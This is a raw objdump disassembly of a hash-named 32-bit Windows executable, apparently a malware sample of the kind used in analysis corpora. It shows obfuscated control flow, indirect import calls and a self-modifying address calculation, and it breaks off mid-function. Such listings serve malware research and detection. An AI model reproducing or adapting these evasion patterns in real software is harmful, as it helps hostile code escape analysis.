
62f666bd720c5858d3613f1650ff0b3309383dcb741b96cde8f2270d1fc8c7be.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    edi,edi
  401006:	push   ebp
  401007:	mov    ebp,esp
  401009:	sub    esp,0x3c
  40100c:	push   eax
  40100d:	push   0x0
  40100f:	push   0x403008
  401014:	pop    eax
  401015:	repz call DWORD PTR [eax]
  401018:	pop    eax
  401019:	push   eax
  40101a:	push   edx
  40101b:	push   edi
  40101c:	push   DWORD PTR [eax+0x380]
  401022:	push   DWORD PTR [eax+0x2a8]
  401028:	call   0x401910
  40102d:	add    esp,0x10
  401030:	pop    eax
  401031:	push   eax
  401032:	push   0x0
  401034:	push   0x403018
  401039:	pop    eax
  40103a:	repz call DWORD PTR [eax]
  40103d:	pop    eax
  40103e:	sub    esp,0xffffffc4
  401041:	mov    ebp,DWORD PTR [esp]
  401044:	add    esp,0x4
  401047:	ret    
  401048:	add    BYTE PTR [eax],al
  40104a:	add    BYTE PTR [eax],al
  40104c:	mov    edi,edi
  40104e:	push   ebp
  40104f:	mov    ebp,esp
  401051:	sub    esp,0x44
  401054:	push   eax
  401055:	push   edx
  401056:	push   ebx
  401057:	call   0x401168
  40105c:	add    esp,0x8
  40105f:	pop    eax
  401060:	push   eax
  401061:	push   0x403038
  401066:	pop    eax
  401067:	repz call DWORD PTR [eax]
  40106a:	pop    eax
  40106b:	push   eax
  40106c:	push   0x0
  40106e:	push   0x403054
  401073:	pop    eax
  401074:	repz call DWORD PTR [eax]
  401077:	pop    eax
  401078:	sub    esp,0xffffffbc
  40107b:	mov    ebp,DWORD PTR [esp]
  40107e:	add    esp,0x4
  401081:	ret    
  401082:	add    BYTE PTR [eax],al
  401084:	push   0x0
  401086:	call   DWORD PTR ds:0x403040
  40108c:	add    BYTE PTR [eax],al
  40108e:	add    BYTE PTR [eax],al
  401090:	mov    edi,edi
  401092:	pusha  
  401093:	push   ebp
  401094:	mov    ebp,esp
  401096:	sub    esp,0x30
  401099:	push   eax
  40109a:	push   0x0
  40109c:	push   0x403030
  4010a1:	pop    eax
  4010a2:	repz call DWORD PTR [eax]
  4010a5:	pop    eax
  4010a6:	push   eax
  4010a7:	push   DWORD PTR [eax+0x1e4]
  4010ad:	push   DWORD PTR [eax+0x1a4]
  4010b3:	call   0x401d10
  4010b8:	add    esp,0x8
  4010bb:	pop    eax
  4010bc:	mov    ecx,0x403044
  4010c1:	mov    ecx,DWORD PTR [ecx]
  4010c3:	push   ecx
  4010c4:	push   DWORD PTR [eax+0x26c]
  4010ca:	pop    ebx
  4010cb:	call   ebx
  4010cd:	sub    esp,0xffffffd0
  4010d0:	mov    ebp,DWORD PTR [esp]
  4010d3:	add    esp,0x4
  4010d6:	ret    
  4010d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4010dd:	sub    esp,0x54
  4010e0:	push   eax
  4010e1:	push   esi
  4010e2:	push   ebx
  4010e3:	push   edx
  4010e4:	push   DWORD PTR [eax+0x3a8]
  4010ea:	call   0x4017f4
  4010ef:	add    esp,0x10
  4010f2:	pop    eax
  4010f3:	push   eax
  4010f4:	mov    eax,0x0
  4010f9:	push   eax
  4010fa:	push   0x40301c
  4010ff:	pop    eax
  401100:	repz call DWORD PTR [eax]
  401103:	pop    eax
  401104:	push   eax
  401105:	mov    ebx,0x0
  40110a:	push   ebx
  40110b:	push   0x403030
  401110:	pop    eax
  401111:	repz call DWORD PTR [eax]
  401114:	pop    eax
  401115:	sub    esp,0xffffffac
  401118:	mov    ebp,DWORD PTR [esp]
  40111b:	add    esp,0x4
  40111e:	ret    
  40111f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401125:	sub    esp,0x48
  401128:	push   eax
  401129:	push   0x0
  40112b:	push   0x403000
  401130:	pop    eax
  401131:	repz call DWORD PTR [eax]
  401134:	pop    eax
  401135:	push   eax
  401136:	push   DWORD PTR [eax+0x330]
  40113c:	push   DWORD PTR [eax+0x38]
  40113f:	call   0x401c78
  401144:	add    esp,0x8
  401147:	pop    eax
  401148:	push   eax
  401149:	mov    ecx,0x0
  40114e:	push   ecx
  40114f:	push   0x403030
  401154:	pop    eax
  401155:	repz call DWORD PTR [eax]
  401158:	pop    eax
  401159:	sub    esp,0xffffffb8
  40115c:	mov    ebp,DWORD PTR [esp]
  40115f:	add    esp,0x4
  401162:	ret    
  401163:	add    BYTE PTR [eax],al
  401165:	add    BYTE PTR [eax],al
  401167:	add    BYTE PTR [ebx-0x1374aa01],cl
  40116d:	sub    esp,0x38
  401170:	push   eax
  401171:	push   ecx
  401172:	push   DWORD PTR [eax+0x2f4]
  401178:	push   DWORD PTR [eax+0x1c0]
  40117e:	push   ecx
  40117f:	call   0x4019a4
  401184:	add    esp,0x10
  401187:	pop    eax
  401188:	push   eax
  401189:	lea    esi,[eax-0x100]
  40118f:	push   esi
  401190:	push   0x403044
  401195:	pop    eax
  401196:	repz call DWORD PTR [eax]
  401199:	test   eax,eax
  40119b:	jne    0x401189
  40119d:	pop    eax
  40119e:	push   eax
  40119f:	push   0x403038
  4011a4:	pop    eax
  4011a5:	repz call DWORD PTR [eax]
  4011a8:	pop    eax
  4011a9:	sub    esp,0xffffffc8
  4011ac:	mov    ebp,DWORD PTR [esp]
  4011af:	add    esp,0x4
  4011b2:	ret    
  4011b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4011b9:	sub    esp,0x48
  4011bc:	push   eax
  4011bd:	push   DWORD PTR [eax+0x260]
  4011c3:	push   DWORD PTR [eax+0x208]
  4011c9:	push   DWORD PTR [eax+0x3c8]
  4011cf:	push   DWORD PTR [eax+0x10]
  4011d2:	call   0x401a2c
  4011d7:	add    esp,0x10
  4011da:	pop    eax
  4011db:	push   eax
  4011dc:	mov    ebx,0x0
  4011e1:	push   ebx
  4011e2:	push   0x403030
  4011e7:	pop    eax
  4011e8:	repz call DWORD PTR [eax]
  4011eb:	pop    eax
  4011ec:	push   eax
  4011ed:	push   0x0
  4011ef:	push   0x403030
  4011f4:	pop    eax
  4011f5:	repz call DWORD PTR [eax]
  4011f8:	pop    eax
  4011f9:	sub    esp,0xffffffb8
  4011fc:	mov    ebp,DWORD PTR [esp]
  4011ff:	add    esp,0x4
  401202:	ret    
  401203:	add    BYTE PTR [ebx-0x1374aa01],cl
  401209:	sub    esp,0x44
  40120c:	push   eax
  40120d:	mov    esi,0x0
  401212:	push   esi
  401213:	push   0x403024
  401218:	pop    eax
  401219:	repz call DWORD PTR [eax]
  40121c:	pop    eax
  40121d:	push   eax
  40121e:	push   edi
  40121f:	push   DWORD PTR [eax+0x378]
  401225:	push   ebx
  401226:	call   0x40195c
  40122b:	add    esp,0xc
  40122e:	pop    eax
  40122f:	push   eax
  401230:	push   0x0
  401232:	push   0x403030
  401237:	pop    eax
  401238:	repz call DWORD PTR [eax]
  40123b:	pop    eax
  40123c:	sub    esp,0xffffffbc
  40123f:	mov    ebp,DWORD PTR [esp]
  401242:	add    esp,0x4
  401245:	ret    
  401246:	add    BYTE PTR [eax],al
  401248:	mov    edi,edi
  40124a:	push   ebp
  40124b:	mov    ebp,esp
  40124d:	sub    esp,0x2c
  401250:	push   eax
  401251:	push   0x403048
  401256:	pop    eax
  401257:	repz call DWORD PTR [eax]
  40125a:	pop    eax
  40125b:	push   eax
  40125c:	push   DWORD PTR [eax+0x2c4]
  401262:	push   DWORD PTR [eax+0x88]
  401268:	push   ebx
  401269:	push   esi
  40126a:	call   0x401e74
  40126f:	add    esp,0x10
  401272:	pop    eax
  401273:	push   eax
  401274:	mov    ebx,0x0
  401279:	push   ebx
  40127a:	push   0x403000
  40127f:	pop    eax
  401280:	repz call DWORD PTR [eax]
  401283:	pop    eax
  401284:	sub    esp,0xffffffd4
  401287:	mov    ebp,DWORD PTR [esp]
  40128a:	add    esp,0x4
  40128d:	ret    
  40128e:	add    BYTE PTR [eax],al
  401290:	mov    edi,edi
  401292:	push   ebp
  401293:	mov    ebp,esp
  401295:	sub    esp,0x3c
  401298:	push   eax
  401299:	push   0x403038
  40129e:	pop    eax
  40129f:	repz call DWORD PTR [eax]
  4012a2:	pop    eax
  4012a3:	push   eax
  4012a4:	push   edx
  4012a5:	push   DWORD PTR [eax+0x124]
  4012ab:	call   0x40104c
  4012b0:	add    esp,0x8
  4012b3:	pop    eax
  4012b4:	push   eax
  4012b5:	push   0x0
  4012b7:	push   0x403054
  4012bc:	pop    eax
  4012bd:	repz call DWORD PTR [eax]
  4012c0:	pop    eax
  4012c1:	sub    esp,0xffffffc4
  4012c4:	mov    ebp,DWORD PTR [esp]
  4012c7:	add    esp,0x4
  4012ca:	ret    
  4012cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012d1:	sub    esp,0x20
  4012d4:	push   eax
  4012d5:	push   esi
  4012d6:	push   esi
  4012d7:	push   DWORD PTR [eax+0x94]
  4012dd:	push   DWORD PTR [eax+0x2e8]
  4012e3:	call   0x401880
  4012e8:	add    esp,0x10
  4012eb:	pop    eax
  4012ec:	push   eax
  4012ed:	push   0x0
  4012ef:	push   0x40301c
  4012f4:	pop    eax
  4012f5:	repz call DWORD PTR [eax]
  4012f8:	pop    eax
  4012f9:	push   eax
  4012fa:	mov    edx,0x0
  4012ff:	push   edx
  401300:	push   0x403078
  401305:	pop    eax
  401306:	repz call DWORD PTR [eax]
  401309:	pop    eax
  40130a:	sub    esp,0xffffffe0
  40130d:	mov    ebp,DWORD PTR [esp]
  401310:	add    esp,0x4
  401313:	ret    
  401314:	add    BYTE PTR [eax],al
  401316:	add    BYTE PTR [eax],al
  401318:	mov    edi,edi
  40131a:	push   ebp
  40131b:	mov    ebp,esp
  40131d:	sub    esp,0x40
  401320:	push   eax
  401321:	push   DWORD PTR [eax+0x60]
  401324:	push   DWORD PTR [eax+0xf8]
  40132a:	push   ecx
  40132b:	push   ebx
  40132c:	call   0x401504
  401331:	add    esp,0x10
  401334:	pop    eax
  401335:	push   eax
  401336:	mov    edx,0x0
  40133b:	push   edx
  40133c:	push   0x40301c
  401341:	pop    eax
  401342:	repz call DWORD PTR [eax]
  401345:	pop    eax
  401346:	push   eax
  401347:	push   0x403048
  40134c:	pop    eax
  40134d:	repz call DWORD PTR [eax]
  401350:	pop    eax
  401351:	sub    esp,0xffffffc0
  401354:	mov    ebp,DWORD PTR [esp]
  401357:	add    esp,0x4
  40135a:	ret    
  40135b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401361:	sub    esp,0x4c
  401364:	push   eax
  401365:	push   DWORD PTR [eax+0xfc]
  40136b:	push   edi
  40136c:	push   DWORD PTR [eax+0x118]
  401372:	call   0x401004
  401377:	add    esp,0xc
  40137a:	pop    eax
  40137b:	push   eax
  40137c:	mov    edi,0x0
  401381:	push   edi
  401382:	push   0x403024
  401387:	pop    eax
  401388:	repz call DWORD PTR [eax]
  40138b:	pop    eax
  40138c:	push   eax
  40138d:	push   0x0
  40138f:	push   0x403068
  401394:	pop    eax
  401395:	repz call DWORD PTR [eax]
  401398:	pop    eax
  401399:	sub    esp,0xffffffb4
  40139c:	mov    ebp,DWORD PTR [esp]
  40139f:	add    esp,0x4
  4013a2:	ret    
  4013a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013a9:	sub    esp,0x50
  4013ac:	push   eax
  4013ad:	push   DWORD PTR [eax+0x244]
  4013b3:	push   ecx
  4013b4:	push   esi
  4013b5:	call   0x401cc4
  4013ba:	add    esp,0xc
  4013bd:	pop    eax
  4013be:	push   eax
  4013bf:	mov    esi,0x0
  4013c4:	push   esi
  4013c5:	push   0x40302c
  4013ca:	pop    eax
  4013cb:	repz call DWORD PTR [eax]
  4013ce:	pop    eax
  4013cf:	push   eax
  4013d0:	push   0x0
  4013d2:	push   0x403078
  4013d7:	pop    eax
  4013d8:	repz call DWORD PTR [eax]
  4013db:	pop    eax
  4013dc:	sub    esp,0xffffffb0
  4013df:	mov    ebp,DWORD PTR [esp]
  4013e2:	add    esp,0x4
  4013e5:	ret    
	...
  4013fa:	add    BYTE PTR [eax],al
  4013fc:	mov    edi,edi
  4013fe:	push   ebp
  4013ff:	mov    ebp,esp
  401401:	sub    esp,0x58
  401404:	push   eax
  401405:	push   DWORD PTR [eax+0x3c0]
  40140b:	push   DWORD PTR [eax+0x90]
  401411:	push   DWORD PTR [eax+0x2e4]
  401417:	push   DWORD PTR [eax+0x21c]
  40141d:	call   0x401634
  401422:	add    esp,0x10
  401425:	pop    eax
  401426:	push   eax
  401427:	mov    ebx,0x0
  40142c:	push   ebx
  40142d:	push   0x40300c
  401432:	pop    eax
  401433:	repz call DWORD PTR [eax]
  401436:	pop    eax
  401437:	push   eax
  401438:	push   0x0
  40143a:	push   0x40300c
  40143f:	pop    eax
  401440:	repz call DWORD PTR [eax]
  401443:	pop    eax
  401444:	sub    esp,0xffffffa8
  401447:	mov    ebp,DWORD PTR [esp]
  40144a:	add    esp,0x4
  40144d:	ret    
  40144e:	add    BYTE PTR [eax],al
  401450:	mov    edi,edi
  401452:	push   ebp
  401453:	mov    ebp,esp
  401455:	sub    esp,0x20
  401458:	push   eax
  401459:	push   DWORD PTR [eax+0x21c]
  40145f:	push   esi
  401460:	push   DWORD PTR [eax+0x2d8]
  401466:	push   ebx
  401467:	call   0x4010d8
  40146c:	add    esp,0x10
  40146f:	pop    eax
  401470:	push   eax
  401471:	push   0x0
  401473:	push   0x403034
  401478:	pop    eax
  401479:	repz call DWORD PTR [eax]
  40147c:	pop    eax
  40147d:	push   eax
  40147e:	mov    ebx,0x0
  401483:	push   ebx
  401484:	push   0x40302c
  401489:	pop    eax
  40148a:	repz call DWORD PTR [eax]
  40148d:	pop    eax
  40148e:	sub    esp,0xffffffe0
  401491:	mov    ebp,DWORD PTR [esp]
  401494:	add    esp,0x4
  401497:	ret    
	...
  4014a4:	mov    eax,0x403048
  4014a9:	dec    DWORD PTR [eax]
  4014ab:	call   DWORD PTR [eax]
  4014ad:	push   0x0
  4014af:	mov    eax,ds:0x403054
  4014b4:	call   eax
  4014b6:	xor    edx,edx
  4014b8:	xor    edx,0x46d200
  4014be:	dec    dh
  4014c0:	push   edx
  4014c1:	lea    eax,[edx+0x8]
  4014c4:	sub    BYTE PTR [eax],0x50
  4014c7:	push   edx
  4014c8:	mov    eax,0x403044
  4014cd:	add    DWORD PTR [eax],0xffffffff
  4014d0:	call   DWORD PTR ds:0x403044
  4014d6:	mov    ecx,eax
  4014d8:	stc    
  4014d9:	adc    al,0x3b
  4014db:	add    ecx,DWORD PTR [eax]
  4014dd:	mov    eax,DWORD PTR [ecx+0x1c]
  4014e0:	ror    eax,0x8
  4014e3:	sub    al,0x0
  4014e5:	sub    al,0x45
  4014e7:	pop    eax
  4014e8:	jb     0x4014f0
  4014ea:	nop
  4014eb:	jmp    0x401090
  4014f0:	nop
  4014f1:	nop
  4014f2:	nop
  4014f3:	jmp    0x401084
  4014f8:	ret    
	...
  401501:	add    BYTE PTR [eax],al
  401503:	add    BYTE PTR [ebx-0x1374aa01],cl
  401509:	sub    esp,0x3c
  40150c:	push   eax
  40150d:	mov    ecx,0x0
  401512:	push   ecx
  401513:	push   0x40302c
  401518:	pop    eax
  401519:	repz call DWORD PTR [eax]
  40151c:	pop    eax
  40151d:	push   eax
  40151e:	push   DWORD PTR [eax+0x380]
  401524:	push   DWORD PTR [eax+0x150]
  40152a:	push   DWORD PTR [eax+0x94]
  401530:	push   edi
  401531:	call   0x401d54
  401536:	add    esp,0x10
  401539:	pop    eax
  40153a:	push   eax
  40153b:	mov    esi,0x0
  401540:	push   esi
  401541:	push   0x403068
  401546:	pop    eax
  401547:	repz call DWORD PTR [eax]
  40154a:	pop    eax
  40154b:	sub    esp,0xffffffc4
  40154e:	mov    ebp,DWORD PTR [esp]
  401551:	add    esp,0x4
  401554:	ret    
  401555:	add    BYTE PTR [eax],al
  401557:	add    BYTE PTR [ebx-0x1374aa01],cl
  40155d:	sub    esp,0x50
  401560:	push   eax
  401561:	push   0x0
  401563:	push   0x403024
  401568:	pop    eax
  401569:	repz call DWORD PTR [eax]
  40156c:	pop    eax
  40156d:	push   eax
  40156e:	push   esi
  40156f:	push   DWORD PTR [eax+0x368]
  401575:	push   DWORD PTR [eax+0x33c]
  40157b:	push   DWORD PTR [eax+0x78]
  40157e:	call   0x401b60
  401583:	add    esp,0x10
  401586:	pop    eax
  401587:	push   eax
  401588:	push   0x0
  40158a:	push   0x403078
  40158f:	pop    eax
  401590:	repz call DWORD PTR [eax]
  401593:	pop    eax
  401594:	sub    esp,0xffffffb0
  401597:	mov    ebp,DWORD PTR [esp]
  40159a:	add    esp,0x4
  40159d:	ret    
  40159e:	add    BYTE PTR [eax],al
  4015a0:	mov    edi,edi
  4015a2:	push   ebp
  4015a3:	mov    ebp,esp
  4015a5:	sub    esp,0x48
  4015a8:	push   eax
  4015a9:	mov    esi,0x0
  4015ae:	push   esi
  4015af:	push   0x403008
  4015b4:	pop    eax
  4015b5:	repz call DWORD PTR [eax]
  4015b8:	pop    eax
  4015b9:	push   eax
  4015ba:	push   DWORD PTR [eax+0x26c]
  4015c0:	push   DWORD PTR [eax+0x208]
  4015c6:	push   DWORD PTR [eax+0x108]
  4015cc:	call   0x401290
  4015d1:	add    esp,0xc
  4015d4:	pop    eax
  4015d5:	push   eax
  4015d6:	push   0x0
  4015d8:	push   0x403024
  4015dd:	pop    eax
  4015de:	repz call DWORD PTR [eax]
  4015e1:	pop    eax
  4015e2:	sub    esp,0xffffffb8
  4015e5:	mov    ebp,DWORD PTR [esp]
  4015e8:	add    esp,0x4
  4015eb:	ret    
  4015ec:	mov    edi,edi
  4015ee:	push   ebp
  4015ef:	mov    ebp,esp
  4015f1:	sub    esp,0x60
  4015f4:	push   eax
  4015f5:	mov    edx,0x0
  4015fa:	push   edx
  4015fb:	push   0x403034
  401600:	pop    eax
  401601:	repz call DWORD PTR [eax]
  401604:	pop    eax
  401605:	push   eax
  401606:	push   edi
  401607:	push   esi
  401608:	push   edx
  401609:	call   0x4016bc
  40160e:	add    esp,0xc
  401611:	pop    eax
  401612:	push   eax
  401613:	push   0x0
  401615:	push   0x40302c
  40161a:	pop    eax
  40161b:	repz call DWORD PTR [eax]
  40161e:	pop    eax
  40161f:	sub    esp,0xffffffa0
  401622:	mov    ebp,DWORD PTR [esp]
  401625:	add    esp,0x4
  401628:	ret    
	...
  401631:	add    BYTE PTR [eax],al
  401633:	add    BYTE PTR [ebx-0x1374aa01],cl
  401639:	sub    esp,0x28
  40163c:	push   eax
  40163d:	push   0x0
  40163f:	push   0x403018
  401644:	pop    eax
  401645:	repz call DWORD PTR [eax]
  401648:	pop    eax
  401649:	push   eax
  40164a:	push   esi
  40164b:	push   DWORD PTR [eax+0x94]
  401651:	call   0x4012cc
  401656:	add    esp,0x8
  401659:	pop    eax
  40165a:	push   eax
  40165b:	push   0x403048
  401660:	pop    eax
  401661:	repz call DWORD PTR [eax]
  401664:	pop    eax
  401665:	sub    esp,0xffffffd8
  401668:	mov    ebp,DWORD PTR [esp]
  40166b:	add    esp,0x4
  40166e:	ret    
  40166f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401675:	sub    esp,0x58
  401678:	push   eax
  401679:	push   DWORD PTR [eax+0x24c]
  40167f:	push   DWORD PTR [eax+0x2c]
  401682:	push   DWORD PTR [eax+0x164]
  401688:	call   0x401de0
  40168d:	add    esp,0xc
  401690:	pop    eax
  401691:	push   eax
  401692:	lea    edi,[eax-0x100]
  401698:	push   edi
  401699:	push   0x403044
  40169e:	pop    eax
  40169f:	repz call DWORD PTR [eax]
  4016a2:	test   eax,eax
  4016a4:	jne    0x401692
  4016a6:	pop    eax
  4016a7:	push   eax
  4016a8:	push   0x403048
  4016ad:	pop    eax
  4016ae:	repz call DWORD PTR [eax]
  4016b1:	pop    eax
  4016b2:	sub    esp,0xffffffa8
  4016b5:	mov    ebp,DWORD PTR [esp]
  4016b8:	add    esp,0x4
  4016bb:	ret    
  4016bc:	mov    edi,edi
  4016be:	push   ebp
  4016bf:	mov    ebp,esp
  4016c1:	sub    esp,0x48
  4016c4:	push   eax
  4016c5:	lea    eax,[eax-0x100]
  4016cb:	push   eax
  4016cc:	push   0x403044
  4016d1:	pop    eax
  4016d2:	repz call DWORD PTR [eax]
  4016d5:	test   eax,eax
  4016d7:	jne    0x4016c5
  4016d9:	pop    eax
  4016da:	push   eax
  4016db:	push   DWORD PTR [eax+0x158]
  4016e1:	push   DWORD PTR [eax+0x40]
  4016e4:	push   DWORD PTR [eax+0x298]
  4016ea:	push   ebx
  4016eb:	call   0x4017a8
  4016f0:	add    esp,0x10
  4016f3:	pop    eax
  4016f4:	push   eax
  4016f5:	push   0x403048
  4016fa:	pop    eax
  4016fb:	repz call DWORD PTR [eax]
  4016fe:	pop    eax
  4016ff:	sub    esp,0xffffffb8
  401702:	mov    ebp,DWORD PTR [esp]
  401705:	add    esp,0x4
  401708:	ret    
  401709:	add    BYTE PTR [eax],al
  40170b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401711:	sub    esp,0x3c
  401714:	push   eax
  401715:	push   DWORD PTR [eax+0x1a0]
  40171b:	push   edi
  40171c:	call   0x401bf8
  401721:	add    esp,0x8
  401724:	pop    eax
  401725:	push   eax
  401726:	mov    ecx,0x0
  40172b:	push   ecx
  40172c:	push   0x403024
  401731:	pop    eax
  401732:	repz call DWORD PTR [eax]
  401735:	pop    eax
  401736:	push   eax
  401737:	lea    ecx,[eax-0x100]
  40173d:	push   ecx
  40173e:	push   0x403044
  401743:	pop    eax
  401744:	repz call DWORD PTR [eax]
  401747:	test   eax,eax
  401749:	jne    0x401737
  40174b:	pop    eax
  40174c:	sub    esp,0xffffffc4
  40174f:	mov    ebp,DWORD PTR [esp]
  401752:	add    esp,0x4
  401755:	ret    
  401756:	add    BYTE PTR [eax],al
  401758:	mov    edi,edi
  40175a:	push   ebp
  40175b:	mov    ebp,esp
  40175d:	sub    esp,0x58
  401760:	push   eax
  401761:	mov    edi,0x0
  401766:	push   edi
  401767:	push   0x403054
  40176c:	pop    eax
  40176d:	repz call DWORD PTR [eax]
  401770:	pop    eax
  401771:	push   eax
  401772:	push   DWORD PTR [eax+0xb8]
  401778:	push   DWORD PTR [eax+0x258]
  40177e:	push   ecx
  40177f:	push   edx
  401780:	call   0x401248
  401785:	add    esp,0x10
  401788:	pop    eax
  401789:	push   eax
  40178a:	push   0x0
  40178c:	push   0x403034
  401791:	pop    eax
  401792:	repz call DWORD PTR [eax]
  401795:	pop    eax
  401796:	sub    esp,0xffffffa8
  401799:	mov    ebp,DWORD PTR [esp]
  40179c:	add    esp,0x4
  40179f:	ret    
	...
  4017a8:	mov    edi,edi
  4017aa:	push   ebp
  4017ab:	mov    ebp,esp
  4017ad:	sub    esp,0x60
  4017b0:	push   eax
  4017b1:	push   DWORD PTR [eax+0x230]
  4017b7:	push   edx
  4017b8:	push   ebx
  4017b9:	push   DWORD PTR [eax+0x108]
  4017bf:	call   0x401558
  4017c4:	add    esp,0x10
  4017c7:	pop    eax
  4017c8:	push   eax
  4017c9:	mov    ecx,0x0
  4017ce:	push   ecx
  4017cf:	push   0x40301c
  4017d4:	pop    eax
  4017d5:	repz call DWORD PTR [eax]
  4017d8:	pop    eax
  4017d9:	push   eax
  4017da:	push   0x0
  4017dc:	push   0x403018
  4017e1:	pop    eax
  4017e2:	repz call DWORD PTR [eax]
  4017e5:	pop    eax
  4017e6:	sub    esp,0xffffffa0
  4017e9:	mov    ebp,DWORD PTR [esp]
  4017ec:	add    esp,0x4
  4017ef:	ret    
  4017f0:	add    BYTE PTR [eax],al
  4017f2:	add    BYTE PTR [eax],al
  4017f4:	mov    edi,edi
  4017f6:	push   ebp
  4017f7:	mov    ebp,esp
  4017f9:	sub    esp,0x44
  4017fc:	push   eax
  4017fd:	mov    ebx,0x0
  401802:	push   ebx
  401803:	push   0x403034
  401808:	pop    eax
  401809:	repz call DWORD PTR [eax]
  40180c:	pop    eax
  40180d:	push   eax
  40180e:	push   ecx
  40180f:	push   DWORD PTR [eax+0x194]
  401815:	push   edx
  401816:	push   esi
  401817:	call   0x401d90
  40181c:	add    esp,0x10
  40181f:	pop    eax
  401820:	push   eax
  401821:	mov    ecx,0x0
  401826:	push   ecx
  401827:	push   0x403000
  40182c:	pop    eax
  40182d:	repz call DWORD PTR [eax]
  401830:	pop    eax
  401831:	sub    esp,0xffffffbc
  401834:	mov    ebp,DWORD PTR [esp]
  401837:	add    esp,0x4
  40183a:	ret    
  40183b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401841:	sub    esp,0x50
  401844:	push   eax
  401845:	mov    edi,0x0
  40184a:	push   edi
  40184b:	push   0x403000
  401850:	pop    eax
  401851:	repz call DWORD PTR [eax]
  401854:	pop    eax
  401855:	push   eax
  401856:	push   DWORD PTR [eax+0x38]
  401859:	push   edx
  40185a:	call   0x4015a0
  40185f:	add    esp,0x8
  401862:	pop    eax
  401863:	push   eax
  401864:	mov    ebx,0x0
  401869:	push   ebx
  40186a:	push   0x403024
  40186f:	pop    eax
  401870:	repz call DWORD PTR [eax]
  401873:	pop    eax
  401874:	sub    esp,0xffffffb0
  401877:	mov    ebp,DWORD PTR [esp]
  40187a:	add    esp,0x4
  40187d:	ret    
  40187e:	add    BYTE PTR [eax],al
  401880:	mov    edi,edi
  401882:	push   ebp
  401883:	mov    ebp,esp
  401885:	sub    esp,0x58
  401888:	push   eax
  401889:	push   ecx
  40188a:	push   DWORD PTR [eax+0x290]
  401890:	call   0x4018cc
  401895:	add    esp,0x8
  401898:	pop    eax
  401899:	push   eax
  40189a:	push   0x0
  40189c:	push   0x403000
  4018a1:	pop    eax
  4018a2:	repz call DWORD PTR [eax]
  4018a5:	pop    eax
  4018a6:	push   eax
  4018a7:	mov    ecx,0x0
  4018ac:	push   ecx
  4018ad:	push   0x403054
  4018b2:	pop    eax
  4018b3:	repz call DWORD PTR [eax]
  4018b6:	pop    eax
  4018b7:	sub    esp,0xffffffa8
  4018ba:	mov    ebp,DWORD PTR [esp]
  4018bd:	add    esp,0x4
  4018c0:	ret    
	...
  4018c9:	add    BYTE PTR [eax],al
  4018cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4018d1:	sub    esp,0x34
  4018d4:	push   eax
  4018d5:	push   0x0
  4018d7:	push   0x403054
  4018dc:	pop    eax
  4018dd:	repz call DWORD PTR [eax]
  4018e0:	pop    eax
  4018e1:	push   eax
  4018e2:	push   edx
  4018e3:	push   edi
  4018e4:	call   0x40170c
  4018e9:	add    esp,0x8
  4018ec:	pop    eax
  4018ed:	push   eax
  4018ee:	mov    esi,0x0
  4018f3:	push   esi
  4018f4:	push   0x403068
  4018f9:	pop    eax
  4018fa:	repz call DWORD PTR [eax]
  4018fd:	pop    eax
  4018fe:	sub    esp,0xffffffcc
  401901:	mov    ebp,DWORD PTR [esp]
  401904:	add    esp,0x4
  401907:	ret    
	...
  401910:	mov    edi,edi
  401912:	push   ebp
  401913:	mov    ebp,esp
  401915:	sub    esp,0x60
  401918:	push   eax
  401919:	push   ebx
  40191a:	push   DWORD PTR [eax+0x290]
  401920:	push   edi
  401921:	call   0x401ba0
  401926:	add    esp,0xc
  401929:	pop    eax
  40192a:	push   eax
  40192b:	mov    edx,0x0
  401930:	push   edx
  401931:	push   0x40301c
  401936:	pop    eax
  401937:	repz call DWORD PTR [eax]
  40193a:	pop    eax
  40193b:	push   eax
  40193c:	mov    eax,0x0
  401941:	push   eax
  401942:	push   0x403008
  401947:	pop    eax
  401948:	repz call DWORD PTR [eax]
  40194b:	pop    eax
  40194c:	sub    esp,0xffffffa0
  40194f:	mov    ebp,DWORD PTR [esp]
  401952:	add    esp,0x4
  401955:	ret    
  401956:	add    BYTE PTR [eax],al
  401958:	add    BYTE PTR [eax],al
  40195a:	add    BYTE PTR [eax],al
  40195c:	mov    edi,edi
  40195e:	push   ebp
  40195f:	mov    ebp,esp
  401961:	sub    esp,0x40
  401964:	push   eax
  401965:	push   DWORD PTR [eax+0x1e8]
  40196b:	push   DWORD PTR [eax+0x1a4]
  401971:	push   DWORD PTR [eax+0x33c]
  401977:	call   0x401120
  40197c:	add    esp,0xc
  40197f:	pop    eax
  401980:	push   eax
  401981:	push   0x0
  401983:	push   0x403068
  401988:	pop    eax
  401989:	repz call DWORD PTR [eax]
  40198c:	pop    eax
  40198d:	push   eax
  40198e:	push   0x403038
  401993:	pop    eax
  401994:	repz call DWORD PTR [eax]
  401997:	pop    eax
  401998:	sub    esp,0xffffffc0
  40199b:	mov    ebp,DWORD PTR [esp]
  40199e:	add    esp,0x4
  4019a1:	ret    
  4019a2:	add    BYTE PTR [eax],al
  4019a4:	mov    edi,edi
  4019a6:	push   ebp
  4019a7:	mov    ebp,esp
  4019a9:	sub    esp,0x28
  4019ac:	push   eax
  4019ad:	push   edi
  4019ae:	push   ecx
  4019af:	push   edi
  4019b0:	push   DWORD PTR [eax+0x384]
  4019b6:	call   0x401c38
  4019bb:	add    esp,0x10
  4019be:	pop    eax
  4019bf:	push   eax
  4019c0:	mov    edx,0x0
  4019c5:	push   edx
  4019c6:	push   0x403054
  4019cb:	pop    eax
  4019cc:	repz call DWORD PTR [eax]
  4019cf:	pop    eax
  4019d0:	push   eax
  4019d1:	push   0x0
  4019d3:	push   0x403030
  4019d8:	pop    eax
  4019d9:	repz call DWORD PTR [eax]
  4019dc:	pop    eax
  4019dd:	sub    esp,0xffffffd8
  4019e0:	mov    ebp,DWORD PTR [esp]
  4019e3:	add    esp,0x4
  4019e6:	ret    
	...
  4019ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4019f5:	sub    esp,0x48
  4019f8:	push   eax
  4019f9:	push   ecx
